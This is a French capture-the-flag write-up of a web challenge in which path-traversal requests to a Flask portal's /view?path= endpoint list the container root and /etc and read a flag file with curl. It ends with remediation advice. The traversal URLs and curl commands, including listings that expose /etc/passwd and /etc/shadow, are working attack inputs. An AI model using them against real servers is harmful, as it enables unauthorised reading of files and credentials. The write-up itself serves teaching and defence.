# L'éthique du hacker - Les failles du pouvoir [2/3] (2025) — Web

**Flag :** `OPENNC{1F10|_|5Q11m3m3c0mb47}`

## Énoncé

*« Se méfier de l'autorité, promouvoir la décentralisation. »* Un portail
d'administration XANTHOS repéré en ligne ; il faut l'infiltrer et récupérer un
premier élément prouvant que NEURONA manipule l'infrastructure.
Instance Docker (ctfd-whale), auteur : \0/. Une image d'indice
([Chall-ethique-2b.png](Chall-ethique-2b.png)) montre du pseudo-HTML avec des
balises `<include>` et la mention `Footer_menu.php` → **inclusion / lecture de
fichier**.

## Reconnaissance

Le portail (Flask, Werkzeug) expose :

```
/                     -> page d'accueil, mentionne ?path= pour consulter un document
/view?path=help.txt   -> lit un document interne
/view                 -> "Index of" : listing de répertoire
```

`/view` a donc **deux comportements** selon la cible :
- cible = fichier → lecture du contenu ;
- cible = répertoire → listing HTML façon « Index of ».

## Faille — Path Traversal (LFI)

La lecture directe de fichiers arbitraires par chemin **absolu** paraît filtrée
(help.txt / annonce.txt seulement), mais le **listing de répertoire ne filtre
rien** et suit `..` et les chemins absolus :

```
/view?path=/           -> Index of / (racine du conteneur !)
/view?path=..          -> Index of /app  (le répertoire de l'application)
/view?path=/etc        -> /etc/passwd, /etc/shadow, ...
```

On énumère l'arborescence de l'app :

```
/view?path=/app
  -> app.py, Dockerfile, requirements.txt, static/, pages/, secret/, flags/
/view?path=/app/flags
  -> flag.txt
```

Le flag est dans `/app/flags/flag.txt`, hors du répertoire de base des documents
(`/app/pages`). La lecture accepte en réalité le **traversal `..`** comme le
chemin absolu :

```bash
B=http://legacychalls.hackagou.nc:PORT
curl -s -G "$B/view" --data-urlencode 'path=../flags/flag.txt'
# OPENNC{1F10|_|5Q11m3m3c0mb47}
curl -s -G "$B/view" --data-urlencode 'path=/app/flags/flag.txt'
# OPENNC{1F10|_|5Q11m3m3c0mb47}
```

## Remédiation

- Résoudre le chemin (`os.path.realpath`) et vérifier qu'il reste **sous** le
  répertoire autorisé, aussi bien pour la lecture que pour le listing.
- Ne pas exposer de listing de répertoire suivant `..` / chemins absolus.
- Interdire les composants `..` et les chemins absolus (`werkzeug.utils.secure_filename`).
